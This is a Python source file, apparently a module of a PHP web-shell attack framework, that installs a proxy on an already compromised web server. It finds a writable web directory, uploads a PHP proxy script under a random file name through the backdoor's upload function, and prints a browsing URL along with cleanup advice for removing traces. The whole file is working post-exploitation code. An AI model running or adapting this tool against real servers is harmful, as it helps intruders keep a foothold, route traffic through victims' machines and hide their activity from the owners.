from string import ascii_lowercase
from core.moduleprobeall import ModuleProbe
from core.moduleexception import ModuleException, ProbeException
from core.vector import VectorList, Vector
from core.savedargparse import SavedArgumentParser as ArgumentParser
import re, os, random

WARN_LOCAL_FILE_NOT_FOUND = 'Not found'
WARN_WRITABLE_WEB_FOLDER_NOT_FOUND = "Writable web directory not found"
WARN_UPLOAD_FAIL = 'Upload fail, check path and permission'
WARN_FILE_EXT = 'File name does not have \'.php\' extension'


def join_abs_paths(paths,sep = '/'):
    return sep.join([p.strip(sep) for p in paths])

class Phpproxy(ModuleProbe):
    '''Install PHP proxy to target.'''
    
    support_vectors = VectorList([
      Vector('find.webdir', 'finddir', ["$rpath"]),
      Vector('file.upload', 'upload', ["asd", "$rpath", "-content", "$content"]),
      Vector('system.info', 'document_root', ["document_root"])
    ])
    
    
    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('-find', help='Search install path starting from path', metavar='STARTFOLDER', default ='.')
    argparser.add_argument('-install', help='Install php as remote path', metavar='PATH')
    
    def _prepare_probe(self):
        
        proxy_path = os.path.join(self.modhandler.path_modules, 'net', 'external', 'phpproxy.php')
    
        try:
            f = open(proxy_path)
        except IOError, e:
            raise ProbeException(self.name,  str(e))
        
        self.args['content'] = f.read()
    
        if not self.args['install']:
            result = self.support_vectors.get('finddir').execute(self.modhandler,{'rpath' : self.args['find']})
        
            if not result:
                raise ProbeException(self.name, "%s, specify exact path using -install" % WARN_WRITABLE_WEB_FOLDER_NOT_FOUND)
            else:
                filename = ''.join(random.choice(ascii_lowercase) for x in range(4)) + '.php'
                self.args['install_path'] = '/' + join_abs_paths([result[0], filename])
                self.args['install_url'] = join_abs_paths([result[1], filename])
    
        else:
            if not self.args['install'].endswith('.php'):
                raise ProbeException(self.name, WARN_FILE_EXT)
            
            self.args['install_path'] = self.args['install']
            self.args['install_url'] = ''    
    
    def _probe(self):
        
        result = self.support_vectors.get('upload').execute(self.modhandler, {'rpath' : self.args['install_path'], 'content' : self.args['content']})
        if result:
            self._result = [self.args['install_path'], self.args['install_url']]
        else:
            raise ProbeException(self.name, '\'%s\' %s' % (self.args['install_path'], WARN_UPLOAD_FAIL))
            
    def _output_result(self):
        if not self.args['install_url']:
            filename = self.args['install_path'].split('/')[-1]
            url = '/'.join(self.modhandler.url.split('/')[:3]) + '/where/is/installed/' + filename
        else:
            url = self.args['install_url'] 
            
        sess_filename = join_abs_paths(self.args['install_path'].split('/')[:-1] + ['sess_*'])
            
        self._output = """Php proxy installed, point your browser to %s?u=http://www.google.com .
Delete '%s' and '%s' at session end.""" % ( url, self.args['install_path'], sess_filename )
        
            
        